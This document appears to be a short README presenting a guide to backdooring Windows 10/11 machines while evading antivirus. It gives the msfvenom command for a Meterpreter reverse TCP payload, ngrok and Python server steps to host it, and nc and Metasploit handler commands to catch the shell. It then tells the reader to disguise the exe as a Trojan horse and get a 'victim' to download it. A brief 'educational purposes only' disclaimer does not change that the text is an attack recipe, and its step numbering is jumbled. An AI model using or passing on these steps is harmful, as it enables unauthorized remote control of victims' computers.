# Windows 11/10 Evade AV & Backdoor

#### **NOTE: For educational purposes only!**
#### **NOTE: Some Meterpreter commands may upset Defender.**
#### **NOTE: User must accept CMD prompt to run file. Working on a way to bypass this with send.keys() or another method.**

## Steps to Compromise:

1. **Generate the payload:** <br>
Using meterpreter here, but feel free to play around with it. <br>
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YOUR_IP_ADDRESS] LPORT=53 -a x86 -f exe -o (File_Name).exe
4. **Setup server in files directory:** <br>
**Using ngrok for remote, or python http server for local testing** <br>
ngrok tcp 80 or python3 -m http.server 80
Using ngrok for remote, or python http server for local testing
5. **Setup your listener with nc or msfconsole:** <br>
nc -lvnp 53 <br>
or <br>
msfconsole -q <br>
msf> use multi/handler <br>
msf  exploit(handler) > set payload windows/meterpreter/reverse_tcp <br>
msf  exploit(handler) > set LHOST <Listening_IP> (for example set LHOST 192.168.5.55) <br>
msf exploit(handler) > set LPORT <Listening_Port> (for example set LPORT 53) <br>
msf exploit(handler) > exploit <br>
1. **Setup Trojan Horse.** 
8. **Get creative. Have victim download "exe" file to their machine (i.e through ngrok server, google drive, discord, or other means.)**
  
# Demonstration Video
[![Click Me](https://img.youtube.com/vi/hwz77o8YMUA&t/0.jpg)](https://www.youtube.com/watch?v=hwz77o8YMUA&t)
[![Click Me](https://img.youtube.com/vi/IceMkFfI4fo/0.jpg)](https://www.youtube.com/watch?v=IceMkFfI4fo)
